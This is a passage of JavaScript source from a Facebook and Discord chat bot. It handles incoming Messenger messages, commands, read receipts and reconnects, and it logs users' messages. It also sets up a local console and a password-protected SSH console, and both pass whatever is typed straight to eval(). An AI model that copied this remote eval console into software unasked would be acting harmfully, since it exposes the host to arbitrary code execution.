                  return null;
                }
                api.sendMessage(botname + " | Connected. \r\n" + connectedmsg, id, function (err) {
                  if (err) {
                    log(
                      "[Facebook]",
                      "Remove Pending Messages encountered an error (at sendMessage:OTHER):",
                      err
                    );
                    if (err.error == "Not logged in." && global.config
                      .facebookAutoRestartLoggedOut) {
                      log(
                        "[Facebook]",
                        "Detected not logged in. Throwing 7378278 to restarting..."
                      );
                      facebookloggedIn = false;
                      process.exit(7378278);
                    }
                    return null;
                  }
                  log("[Facebook]", "Bot added to", id);
                });
              });
            }, i * 2000, list[i].threadID);
          }
          api.markAsReadAll(function (err) {
            if (err) {
              if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                log("[Facebook]", "Not logged in. Triggering restart...");
                process.exit(7378278);
              }
            }
          });
        });
      });
    }, 120000, log, global.config.botname, global.lang.CONNECTED_MESSAGE.replace("{0}", global.config
      .commandPrefix));
    // 120s 1 lần scan pending message (không như con bot nào đó đặt tới mấy tiếng)
    typeof global.data.messageList != "object" ? global.data.messageList = {} : "";
    facebook.listener = api.listenMqtt(function callback(err, message) {
      try {
        if (typeof message != "undefined" && message != null) {
          var nointernalresolve = false;
          switch (message.type) {
            case "read":
            case "read_receipt":
            case "presence":
            case "typ":
              return;
          }
          var receivetime = new Date();
          if (global.config.enableGlobalBan) {
            fbGlobalBanTrigger(message.threadID);
          }
          if (global.data.fbBannedUsers.indexOf(message.senderID || message.author) == 1 || global.config
            .enableGlobalBan) {
            for (var n in global.chatHook) {
              if (global.chatHook[n].listenplatform & 1) {
                var chhandling = global.chatHook[n];
                if (chhandling.listentype == "everything") {
                  var admin = false;
                  if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
                    admin = true;
                  }
                  if (typeof chhandling.resolverFunc == "function" && chhandling.resolverFunc("Facebook", {
                    time: receivetime,
                    msgdata: message,
                    facebookapi: api,
                    discordapi: client,
                    prefix: prefix,
                    admin: admin,
                    // eslint-disable-next-line no-loop-func
                    log: function logPlugin(...message) {
                      log.apply(global, [
                        "[PLUGIN]",
                        "[" + String(chhandling.handler) + "]"
                      ].concat(message));
                    },
                    // eslint-disable-next-line no-loop-func
                    return: function returndata(returndata) {
                      if (!returndata) return;
                      if (returndata.handler == "internal" && typeof returndata.data == "string") {
                        var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                          .isGroup);
                        setTimeout(function (api, returndata, endTyping, message) {
                          api.sendMessage(prefix + " " + returndata.data, message.threadID, function (err) {
                            if (err) {
                              log("[Facebook] Errored while sending response:", err);
                              if (err.error == "Not logged in." && global.config
                                .facebookAutoRestartLoggedOut) {
                                log(
                                  "[Facebook]",
                                  "Detected not logged in. Throwing 7378278 to restarting..."
                                );
                                facebookloggedIn = false;
                                process.exit(7378278);
                              }
                            }
                          }, message.messageID, message.isGroup);
                          endTyping();
                        }, returndata.data.length * 30, api, returndata, endTyping, message);
                      } else if (returndata.handler == "internal-raw" && typeof returndata.data ==
                        "object") {
                        if (!returndata.data.body) {
                          returndata.data.body = "";
                        }
                        returndata.data.body = prefix + " " + returndata.data.body;
                        var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                          .isGroup);
                        setTimeout(
                          function (api, returndata, endTyping, message, log) {
                            api.sendMessage(returndata.data, message.threadID, function (err) {
                              if (err) {
                                log("[Facebook] Errored while sending response:", err);
                                if (err.error == "Not logged in." && global.config
                                  .facebookAutoRestartLoggedOut) {
                                  log(
                                    "[Facebook]",
                                    "Detected not logged in. Throwing 7378278 to restarting..."
                                  );
                                  facebookloggedIn = false;
                                  process.exit(7378278);
                                }
                              }
                            }, message.messageID, message.isGroup);
                            endTyping();
                          }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping, message,
                          log
                        );
                      }
                    }
                  }) === true) {
                    nointernalresolve = true;
                  }
                }
              }
            }
          } else {
            nointernalresolve = true;
          }
          switch (message.type) {
            case "message":
              !global.deliveryFacebook[message.threadID] ? global.deliveryFacebook[message.threadID] = [] : "";
              global.deliveryFacebook[message.threadID].push(message.messageID);
              fetchName(message.senderID);
              if (message.isGroup) {
                !global.data.facebookChatGroupList ? global.data.facebookChatGroupList = [] : "";
                if (global.data.facebookChatGroupList.indexOf(message.threadID) == -1) global.data
                  .facebookChatGroupList.push(message.threadID);
              }
              if (global.markAsReadFacebook[message.threadID]) {
                try {
                  clearTimeout(global.markAsReadFacebook[message.threadID]);
                } catch (ex) { }
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              } else {
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              }
              var arg = message.body.replace((/”/g), "\"")
                .replace((/“/g), "\"")
                .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
                .filter(function (el) {
                  return !(el == null || el == "" || el == " " || !el.replace(/\s/g, '')
                    .length);
                })
                .map(function (z) {
                  return z.replace(/"/g, "");
                });
              if (arg.indexOf("@everyone") != -1 && (global.config.allowEveryoneTagEvenBlacklisted || ((global
                .config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) || (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1
                ) && !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message
                  .senderID))) && !global.data.everyoneTagBlacklist[message.threadID]) {
                api.getThreadInfo(message.threadID, function (err, data) {
                  var participants = data.participantIDs;
                  var character = "@";
                  var sendString = "";
                  var mentionObj = [];
                  var i = 0;
                  for (var n in participants) {
                    sendString += character;
                    mentionObj.push({
                      tag: character,
                      id: participants[n],
                      fromIndex: i
                    });
                    i++;
                  }
                  api.sendMessage({
                    body: sendString,
                    mentions: mentionObj
                  }, message.threadID, function (err) {
                    if (err) {
                      log("[Facebook]", "@everyone errored:", err);
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  }, message.messageID, message.isGroup);
                });
              }
              if (message.body.startsWith(global.config.commandPrefix) && !nointernalresolve) {
                if ((global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) ||
                  (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1) &&
                  !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message.senderID)
                ) {
                  log(
                    "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                    "issued command in", message.threadID + ":", message.body
                  );
                  if (global.commandMapping[arg[0].substr(1)]) {
                    if (!(global.commandMapping[arg[0].substr(1)].compatibly & 1) && global.commandMapping[arg[0]
                      .substr(1)].compatibly != 0) {
                      api.sendMessage(
                        prefix + " " + global.lang["UNSUPPORTED_INTERFACE"], message.threadID,
                        function (err) {
                          if (err) {
                            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                              facebookloggedIn = false;
                              process.exit(7378278);
                            }
                          }
                        }, message.messageID, message.isGroup
                      );
                    } else {
                      var argv = JSON.parse(JSON.stringify(arg));
                      var admin = false;
                      if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
                        admin = true;
                      }
                      var mentions = {};
                      for (var y in message.mentions) {
                        mentions["FB-" + y] = message.mentions[y];
                      }
                      try {
                        if (!client) {
                          client = null;
                        }
                        var starttime = Date.now();
                        var timingwarning = setInterval(function () {
                          var calctime = (Date.now() - starttime) / 1000;
                          if (calctime >= 10) {
                            log(
                              "[INTERNAL]", "Timing Warning: Command \"", arg.join(" "),
                              "\" is taking over", calctime.toFixed(3) + "s to execute and still not done."
                            );
                          }
                        }, 10000);
                        try {
                          var returndata = global.commandMapping[arg[0].substr(1)].scope("Facebook", {
                            args: argv,
                            time: receivetime,
                            msgdata: message,
                            facebookapi: api,
                            discordapi: client,
                            prefix: prefix,
                            admin: admin,
                            mentions: mentions,
                            log: function logPlugin(...message) {
                              log.apply(global, [
                                "[PLUGIN]",
                                "[" + (global.commandMapping[arg[0].substr(1)] || {
                                  handler: "ERROR"
                                })
                                  .handler + "]"
                              ].concat(message));
                            },
                            return: function returndata(returndata) {
                              if (!returndata) return;
                              if (returndata.handler == "internal" && typeof returndata.data == "string") {
                                var endTyping = api.sendTypingIndicator(
                                  message.threadID, function () { },
                                  message.isGroup
                                );
                                setTimeout(function (api, returndata, endTyping, message) {
                                  api.sendMessage(
                                    prefix + " " + returndata.data, message.threadID,
                                    function (err) {
                                      if (err) {
                                        log("[Facebook] Errored while sending response:", err);
                                        if (err.error == "Not logged in." && global.config
                                          .facebookAutoRestartLoggedOut) {
                                          log(
                                            "[Facebook]",
                                            "Detected not logged in. Throwing 7378278 to restarting..."
                                          );
                                          facebookloggedIn = false;
                                          process.exit(7378278);
                                        }
                                      }
                                    }, message.messageID, message.isGroup
                                  );
                                  endTyping();
                                }, returndata.data.length * 30, api, returndata, endTyping, message);
                              } else if (returndata.handler == "internal-raw" && typeof returndata.data ==
                                "object") {
                                if (!returndata.data.body) {
                                  returndata.data.body = "";
                                }
                                returndata.data.body = prefix + " " + returndata.data.body;
                                var endTyping = api.sendTypingIndicator(
                                  message.threadID, function () { },
                                  message.isGroup
                                );
                                setTimeout(
                                  function (api, returndata, endTyping, message, log) {
                                    api.sendMessage(returndata.data, message.threadID, function (err) {
                                      if (err) {
                                        log("[Facebook] Errored while sending response:", err);
                                        if (err.error == "Not logged in." && global.config
                                          .facebookAutoRestartLoggedOut) {
                                          log(
                                            "[Facebook]",
                                            "Detected not logged in. Throwing 7378278 to restarting..."
                                          );
                                          facebookloggedIn = false;
                                          process.exit(7378278);
                                        }
                                      }
                                    }, message.messageID, message.isGroup);
                                    endTyping();
                                  }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping,
                                  message, log
                                );
                              }
                            }
                          });
                        } catch (ex) {
                          log(
                            "[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:",
                            ex
                          );
                          var stack = ex.stack.match(/[^\r\n]+/g);
                          returndata = {
                            handler: "internal",
                            data: "plerr: " + stack.slice(0, 4)
                              .join("\r\n")
                          };
                        }
                        if (typeof returndata == "object") {
                          if (returndata.handler == "internal" && typeof returndata.data == "string") {
                            var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                              .isGroup);
                            setTimeout(function (api, returndata, endTyping, message) {
                              api.sendMessage(prefix + " " + returndata.data, message.threadID, function (err) {
                                if (err) {
                                  log("[Facebook] Errored while sending response:", err);
                                  if (err.error == "Not logged in." && global.config
                                    .facebookAutoRestartLoggedOut) {
                                    log(
                                      "[Facebook]",
                                      "Detected not logged in. Throwing 7378278 to restarting..."
                                    );
                                    facebookloggedIn = false;
                                    process.exit(7378278);
                                  }
                                }
                              }, message.messageID, message.isGroup);
                              endTyping();
                            }, returndata.data.length * 30, api, returndata, endTyping, message);
                          } else if (returndata.handler == "internal-raw" && typeof returndata.data == "object") {
                            if (!returndata.data.body) {
                              returndata.data.body = "";
                            }
                            returndata.data.body = prefix + " " + returndata.data.body;
                            var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
                              .isGroup);
                            setTimeout(
                              function (api, returndata, endTyping, message, log) {
                                api.sendMessage(returndata.data, message.threadID, function (err) {
                                  if (err) {
                                    log("[Facebook] Errored while sending response:", err);
                                    if (err.error == "Not logged in." && global.config
                                      .facebookAutoRestartLoggedOut) {
                                      log(
                                        "[Facebook]",
                                        "Detected not logged in. Throwing 7378278 to restarting..."
                                      );
                                      facebookloggedIn = false;
                                      process.exit(7378278);
                                    }
                                  }
                                }, message.messageID, message.isGroup);
                                endTyping();
                              }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping, message,
                              log
                            );
                          }
                        } else if (typeof returndata != "undefined") {
                          log("[Facebook]", "Received an unknown response from plugin:", returndata);
                        }
                        var endtime = Date.now();
                        var calctime = (endtime - starttime) / 1000;
                        if (calctime >= 10) {
                          log("[INTERNAL]", "Timing Warning: Command \"", arg.join(" "), "\" took", calctime
                            .toFixed(3) + "s to execute!");
                        }
                        clearInterval(timingwarning);
                      } catch (ex) {
                        try {
                          log(
                            "[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:",
                            ex
                          );
                        } catch (exp) {
                          log("[INTERNAL]", arg[0], "contain an error:", ex);
                        }
                        try {
                          clearInterval(timingwarning);
                        } catch (ex) { }
                      }
                    }
                  } else {
                    if (!global.config.hideUnknownCommandMessage) {
                      api.sendMessage(prefix + " " + global.lang["UNKNOWN_CMD"].replace("{0}", global.config
                        .commandPrefix), message.threadID, function (err) {
                          if (err) {
                            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                              facebookloggedIn = false;
                              process.exit(7378278);
                            }
                          }
                        }, message.messageID, message.isGroup);
                    }
                  }
                } else {
                  var str = "";
                  for (var n in message.attachments) {
                    var type = message.attachments[n].type;
                    type = type[0].toLocaleUpperCase() + type.substr(1);
                    str += "\r\n  <";
                    str += type;
                    str += " ";
                    switch (message.attachments[n].type) {
                      case "audio":
                      case "video":
                        var dr = new Date(message.attachments[n].duration);
                        str += dr.getUTCHours()
                          .pad(2) + ":" + dr.getUTCMinutes()
                            .pad(2) + ":" + dr.getUTCSeconds()
                              .pad(2) + "." + dr.getUTCMilliseconds()
                                .pad(3);
                        str += " ";
                        if (message.attachments[n].type == "audio") break;
                      // eslint-disable-next-line no-fallthrough
                      case "photo":
                      case "animated_image":
                      case "sticker":
                        str += message.attachments[n].width;
                        str += "x";
                        str += message.attachments[n].height;
                        str += " ";
                    }
                    str += "| ";
                    str += message.attachments[n].url;
                    str += ">";
                  }
                  log(
                    "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                    (message.senderID == message.threadID ? "DMed:" : "messaged in thread " + message.threadID +
                      ":"), message.body, str
                  );
                }
              } else {
                var str = "";
                for (var n in message.attachments) {
                  var type = message.attachments[n].type;
                  type = type[0].toLocaleUpperCase() + type.substr(1);
                  str += "\r\n  <";
                  str += type;
                  str += " ";
                  switch (message.attachments[n].type) {
                    case "audio":
                    case "video":
                      var dr = new Date(message.attachments[n].duration);
                      str += dr.getUTCHours()
                        .pad(2) + ":" + dr.getUTCMinutes()
                          .pad(2) + ":" + dr.getUTCSeconds()
                            .pad(2) + "." + dr.getUTCMilliseconds()
                              .pad(3);
                      str += " ";
                      if (message.attachments[n].type == "audio") break;
                    // eslint-disable-next-line no-fallthrough
                    case "photo":
                    case "animated_image":
                    case "sticker":
                      str += message.attachments[n].width;
                      str += "x";
                      str += message.attachments[n].height;
                      str += " ";
                  }
                  str += "| ";
                  str += message.attachments[n].url;
                  str += ">";
                }
                log(
                  "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")", (
                  message.senderID == message.threadID ? "DMed:" : "messaged in thread " + message.threadID +
                    ":"), message.body, str
                );
              }
              break;
            case "event":
              log("[Facebook]", message);
              try {
                if (message.logMessageType == "log:subscribe") {
                  var containBot = false;
                  var botID = api.getCurrentUserID();
                  for (var n in message.logMessageData.addedParticipants) {
                    if (message.logMessageData.addedParticipants[n].userFbId == botID) {
                      containBot = true;
                    }
                  }
                  if (containBot) {
                    api.sendMessage(
                      global.config.botname + " | Connected. \r\n" + global.lang.CONNECTED_MESSAGE
                        .replace("{0}", global.config.commandPrefix), message.threadID,
                      function (err) {
                        if (err) {
                          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                            facebookloggedIn = false;
                            process.exit(7378278);
                          }
                        }
                      }, null, message.isGroup
                    );
                    log("[Facebook]", message.author, "added Bot to", message.threadID);
                  }
                }
              } catch (ex) {
                log("[Facebook]", ex);
              }
              break;
            case "message_reaction":
              log("[Facebook]", message);
              break;
            case "message_unsend":
              log(
                "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                "deleted a message in " + message.threadID + ". (" + message.messageID + ")"
              );
              break;
            case "message_reply":
              !global.deliveryFacebook[message.threadID] ? global.deliveryFacebook[message.threadID] = [] : "";
              global.deliveryFacebook[message.threadID].push(message.messageID);
              if (message.messageReply) {
                for (var xzxz in message.messageReply.attachments) {
                  if (message.messageReply.attachments[xzxz].error) {
                    fs.writeFileSync(
                      path.join(__dirname, 'logs', 'message-error-' + message.messageID + ".json"),
                      JSON.stringify(message, null, 4), {
                        mode: 0o666
                      }
                    );
                  }
                }
              }
              if (global.markAsReadFacebook[message.threadID]) {
                try {
                  clearTimeout(global.markAsReadFacebook[message.threadID]);
                } catch (ex) { }
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              } else {
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              }
              var arg = message.body.replace((/”/g), "\"")
                .replace((/“/g), "\"")
                .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
                .filter(function (el) {
                  return !(el == null || el == "" || el == " ");
                });
              arg.map(xy => xy.replace(/["]/g, ""));
              if (arg.indexOf("@everyone") != -1 && (global.config.allowEveryoneTagEvenBlacklisted || ((global
                .config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) || (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1
                ) && !Object.prototype.hasOwnProperty.call(global.config.blacklistedUsers, "FB-" + message
                  .senderID)))) {
                api.getThreadInfo(message.threadID, function (err, data) {
                  var participants = data.participantIDs;
                  var character = "@";
                  var sendString = "";
                  var mentionObj = [];
                  var i = 0;
                  for (var n in participants) {
                    sendString += character;
                    mentionObj.push({
                      tag: character,
                      id: participants[n],
                      fromIndex: i
                    });
                    i++;
                  }
                  api.sendMessage({
                    body: sendString,
                    mentions: mentionObj
                  }, message.threadID, function (err) {
                    if (err) {
                      log("[Facebook] @everyone errored:", err);
                    }
                  }, message.messageID, message.isGroup);
                });
              }
              try {
                var str = "";
                for (var n in message.attachments) {
                  var type = message.attachments[n].type;
                  type = type[0].toLocaleUpperCase() + type.substr(1);
                  str += "\r\n  <";
                  str += type;
                  str += " ";
                  switch (message.attachments[n].type) {
                    case "audio":
                    case "video":
                      var dr = new Date(message.attachments[n].duration);
                      str += dr.getUTCHours()
                        .pad(2) + ":" + dr.getUTCMinutes()
                          .pad(2) + ":" + dr.getUTCSeconds()
                            .pad(2) + "." + dr.getUTCMilliseconds()
                              .pad(3);
                      str += " ";
                      if (message.attachments[n].type == "audio") break;
                    // eslint-disable-next-line no-fallthrough
                    case "photo":
                    case "animated_image":
                    case "sticker":
                      str += message.attachments[n].width;
                      str += "x";
                      str += message.attachments[n].height;
                      str += " ";
                  }
                  str += "| ";
                  str += message.attachments[n].url;
                  str += ">";
                }
                log(
                  "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                  "replied to", message.messageReply.senderID, "at", message.threadID + ":", message.body, str
                );
              } catch (ex) {
                log("[Facebook] ERROR on replymsg", message);
                fs.writeFileSync(
                  path.join(__dirname, 'logs', 'message-error-' + message.messageID + ".json"),
                  JSON.stringify(message, null, 4), {
                  mode: 0o666
                }
                );
              }
              break;
            default:
              break;
          }
        } else {
          log("[Facebook]", "Detected undefined!", err);
        }
      } catch (ex) {
        log("[Facebook]", ex, message);
      }
    });
    log("[Facebook]", "Started Facebook listener");
  };
  var fbloginobj = {};
  fbloginobj.email = global.config.fbemail;
  fbloginobj.password = global.config.fbpassword;
  if (global.config.usefbappstate && fs.existsSync(path.join(__dirname, "fbstate.json"))) {
    fbloginobj.appState = JSON.parse(fs.readFileSync(path.join(__dirname, "fbstate.json"), 'utf8'));
  }
  var configobj = {
    userAgent: global.config.fbuseragent,
    logLevel: global.config.DEBUG_FCA_LOGLEVEL,
    selfListen: true,
    listenEvents: true,
    updatePresence: false,
    autoMarkRead: false,
    autoMarkDelivery: false,
    forceLogin: true
  };
  if (global.config.facebookProxy != null) {
    if (global.config.facebookProxyUseSOCKS) {
      //configobj.proxy = "http://127.0.0.1:2813";
      configobj.proxy = `http://${sock2httpAddress == "0.0.0.0" ? "127.0.0.1" : sock2httpAddress}:${sock2httpPort}`;
    } else {
      configobj.proxy = "http://" + global.config.facebookProxy;
    }
  }
  try {
    log("[Facebook]", "Logging in...");
    var _fbinstance = require("fca-unofficial")(fbloginobj, configobj, facebookcb);
    var forceReconnect = function forceReconnect(error) {
      if (!error) {
        log("[Facebook]", "Destroying Facebook Chat instance and creating a new one... (~50 minutes clock)");
      }
      if (typeof facebook.listener == "object" && typeof facebook.listener.stopListening == "function") {
        facebook.listener.stopListening();
        log("[Facebook]", "Stopped Facebook listener");
      }
      if (typeof (facebook.api || {}).getAppState == "function") {
        var temporaryAppState = facebook.api.getAppState();
      } else {
        log("[Facebook]", "Cannot get appstate to reconnect (account not logged in?).");
        return;
      }
      try {
        clearInterval(facebook.removePendingClock);
        clearInterval(facebook.deliveryClock);
      } catch (ex) { }
      _fbinstance = null;
      delete require.cache[require.resolve("fca-unofficial")];
      delete require.cache[require.resolve("mqtt")];
      _fbinstance = require("fca-unofficial")({
        appState: temporaryAppState
      }, configobj, facebookcb);
      log("[Facebook]", "New instance created.");
      log("[Facebook]", "Logging in...");
      setTimeout(function () {
        if (facebook.error && !facebook.listener) {
          log("[Facebook]", "Detected error. Attempting to reconnect...");
          forceReconnect(true);
        }
      }, 30000);
    };
    setInterval(forceReconnect, 2799999 + random(0, 1980000));
  } catch (ex) {
    log("[Facebook]", "Error found in codebase:", ex);
  }
}

var consoleHandle = function (message, SSH) {
  log("[INTERNAL]", `${SSH ? SSH : "CONSOLE"} issued javascript code:`, message);
  try {
    log(`[${SSH ? "SSH-" : ""}JAVASCRIPT]`, eval(message));
  } catch (ex) {
    log(`[${SSH ? "SSH-" : ""}JAVASCRIPT]`, ex);
  }
};
rl.on('line', function (message) {
  consoleHandle(message);
});
rl.setPrompt("console@c3c:js# ");
rl.prompt();

if (global.config.enableSSHRemoteConsole) {
  var ssh2 = require('ssh2');
  var hostkey = {};
  if (fs.existsSync(path.join(__dirname, "sshkey.json"))) {
    hostkey = JSON.parse(fs.readFileSync(path.join(__dirname, "sshkey.json"), {
      encoding: "utf8"
    }));
    log("[SSH]", "Loaded existing host key.");
  } else {
    hostkey = crypto.generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs1',
        format: 'pem'
      }
    });
    fs.writeFileSync(path.join(__dirname, "sshkey.json"), JSON.stringify(hostkey));
    log("[SSH]", "Generated new host key.");
  }
  global.ssh2server = new ssh2.Server({
    hostKeys: [hostkey.privateKey]
  }, function connListener(client, conninfo) {
    log("[SSH]", conninfo.ip + ":" + conninfo.port, "connected with client named", conninfo.header.versions
      .software);
    client.on('authentication', function (ctx) {
      var user = ctx.username;
      if (user.length !== global.config.sshUsername.length || !(user == global.config.sshUsername)) {
        log(
          "[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with wrong username (", user,
          ")"
        );
        return ctx.reject([], false);
      }
      switch (ctx.method) {
        case 'password':
          var password = ctx.password;
          if (password.length === global.config.sshPassword.length && password == global.config.sshPassword) {
            return ctx.accept();
          } else {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with wrong password.");
            return ctx.reject(["password"], false);
          }
        /* case 'publickey':
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "tried to authenticate with public keys, which is not supported.");
          return ctx.reject(); */
        default:
          log(
            "[SSH]", conninfo.ip + ":" + conninfo.port, "is authenticating with method:", ctx.method,
            ". Notifying client that a password is needed..."
          );
          return ctx.reject(["password"], true);
      }
    })
      .on('ready', function () {
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "authenticated successfully.");
        client.on('session', function (accept, _reject) {
          var session = accept();
          //SSH Shell
          session.once('shell', function (accept, _reject) {
            log("[SSH]", conninfo.ip + ":" + conninfo.port, "requested a shell (Remote Console).");
            global.sshstream[conninfo.ip + ":" + conninfo.port] = accept();
            global.sshstream[conninfo.ip + ":" + conninfo.port].write('\u001B[2J\u001B[0;0f');
            global.sshstream[conninfo.ip + ":" + conninfo.port].write(global.config.botname + " v" +
              version + (global.config.botname != "C3CBot" ? " (Powered by C3C)" : ""));
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("https://github.com/lequanglam/c3c");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
            var sshrl = readline.createInterface({
              input: global.sshstream[conninfo.ip + ":" + conninfo.port].stdin,
              output: global.sshstream[conninfo.ip + ":" + conninfo.port].stdout,
              terminal: true,
              prompt: ""
            });
            global.sshcurrsession[conninfo.ip + ":" + conninfo.port] = sshrl;
            sshrl.on('line', (message) => {
              log(
                "[INTERNAL]", conninfo.ip + ":" + conninfo.port, "issued javascript code:",
                message
              );
              try {
                log("[SSH-JAVASCRIPT]", eval(message));
              } catch (ex) {
                log("[SSH-JAVASCRIPT]", ex);
              }
            });
            sshrl.setPrompt("ssh@c3c:js# ");
            sshrl.prompt();
            // process.stdout.pipe(stream, {end: false});
            // stream.pipe(process.stdin, {end: false});
          });
        });
      })
      .on('end', function () {
        delete global.sshcurrsession[conninfo.ip + ":" + conninfo.port];
        delete global.sshstream[conninfo.ip + ":" + conninfo.port];
        log("[SSH]", conninfo.ip + ":" + conninfo.port, "disconnected.");
      })
      .on('error', function (err) {
        log("[SSH]", "ERR!", err);
        delete global.sshcurrsession[conninfo.ip + ":" + conninfo.port];
        delete global.sshstream[conninfo.ip + ":" + conninfo.port];
      });
  })
    .on('error', function (err) {
      log("[SSH]", "ERR!", err);
    })
    .listen(global.config.sshRemoteConsolePort, global.config.sshRemoteConsoleIP, function () {
      log("[SSH]", "Listening for SSH connection at", this.address()
        .address + ":" + this.address()
          .port);
    });
}
typeof global.data.cacheName != "object" ? global.data.cacheName = {} : "";
typeof global.data.everyoneTagBlacklist != "object" ? global.data.everyoneTagBlacklist = {} : "";
var discordid = "Disabled";
if (global.config.enablediscord) {
  discordid = "Not logged in";
  var Discord = require('discord.js');
  global.Discord = Discord;
  client = new Discord.Client();
  client.on('ready', () => {
    log("[Discord]", "Logged in as", client.user.tag + ".");
    discordid = client.user.id;
  });
  client.on('error', error => {
    log("[Discord]", "Crashed with error: ", error);
    log("[Discord]", "Trying to reconnect... Some plugins might not work correctly.");
  });
  var discordMessageHandler = function (message) {
    var nointernalresolve = false;
    var receivetime = new Date();
    for (var n in global.chatHook) {
      if (global.chatHook[n].listenplatform & 2) {
        var chhandling = global.chatHook[n];
        if (chhandling.listentype == "everything") {
          var admin = false;
          if (global.config.admins.indexOf("DC-" + message.author.id) != -1) {
            admin = true;
          }
          if (typeof chhandling.resolverFunc == "function" && chhandling.resolverFunc("Discord", {
            time: receivetime,
            msgdata: message,
            discordapi: client,
            // eslint-disable-next-line no-nested-ternary
            facebookapi: (typeof facebook == "object" ? (typeof facebook.api == "object" ? facebook
              .api : {}) : {}),
            prefix: prefix,
            admin: admin,
            // eslint-disable-next-line no-loop-func
            log: function logPlugin(...message) {
              log.apply(global, [
                "[PLUGIN]",
                "[" + String(chhandling.handler) + "]"
              ].concat(message));
            },
            // eslint-disable-next-line no-loop-func
            return: function returndata(returndata) {
